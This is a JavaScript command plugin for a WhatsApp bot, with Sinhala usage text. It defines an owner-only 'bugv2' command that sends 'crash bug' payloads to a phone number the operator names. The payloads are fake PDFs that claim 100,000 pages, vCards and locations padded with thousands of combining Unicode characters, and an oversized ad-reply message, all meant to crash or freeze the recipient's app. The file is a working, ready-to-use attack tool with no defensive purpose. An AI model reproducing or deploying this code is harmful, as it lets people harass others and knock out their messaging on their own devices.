const { cmd } = require('../command');

cmd({
    pattern: "bugv2",
    alias: ["ultimatebug", "hardcrash"],
    desc: "Various WhatsApp Crash Methods",
    category: "owner",
    react: "☣️",
    filename: __filename
},
async (conn, mek, m, { from, isOwner, reply, args, senderNumber }) => {
    try {
        const authorizedNumbers = ['94740137623']; 
        if (!authorizedNumbers.includes(senderNumber) && !isOwner) return;

        if (!args[0]) return reply("භාවිතය: .bugv2 [නම්බර් එක] [වර්ගය: 1, 2 හෝ 3]");

        let target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        let type = args[1] || "1";

        reply(`☣️ *Railway:* Sending Bug Type ${type} to ${args[0]}...`);

        if (type === "1") {
            // Type 1: PDF Document Bug
            for (let i = 0; i < 5; i++) {
                await conn.sendMessage(target, {
                    document: { url: 'https://files.catbox.moe/vbo0vq.png' }, // ඕනෑම ලින්ක් එකක්
                    mimetype: 'application/pdf',
                    fileName: 'SYSTEM_ERROR.pdf',
                    pageCount: 100000,
                    fileLength: 10000000,
                    caption: "\u0345\u0361\u0345".repeat(1000)
                });
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        } 
        else if (type === "2") {
            // Type 2: Location + vCard Combo
            const vcard = 'BEGIN:VCARD\nVERSION:3.0\nFN:BUG\nX-ABLabel:' + "\u0345".repeat(3000) + '\nEND:VCARD';
            for (let i = 0; i < 5; i++) {
                await conn.sendMessage(target, { contacts: { displayName: '☣️', contacts: [{ vcard }] } });
                await conn.sendMessage(target, { location: { degreesLatitude: 0, degreesLongitude: 0, name: "҉".repeat(1000) } });
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }
        else if (type === "3") {
            // Type 3: Large Button Crash
            await conn.sendMessage(target, {
                text: "☣️ WHATSAPP CRITICAL ERROR ☣️",
                contextInfo: {
                    externalAdReply: {
                        title: "S Y S T E M  F A I L U R E",
                        body: "\u0345".repeat(2000),
                        mediaType: 1,
                        thumbnailUrl: `https://files.catbox.moe/vbo0vq.png`,
                        renderLargerThumbnail: true
                    }
                }
            });
        }

        reply("✅ Bug Deployed Successfully! 💀");

    } catch (e) {
        console.log(e);
    }
});
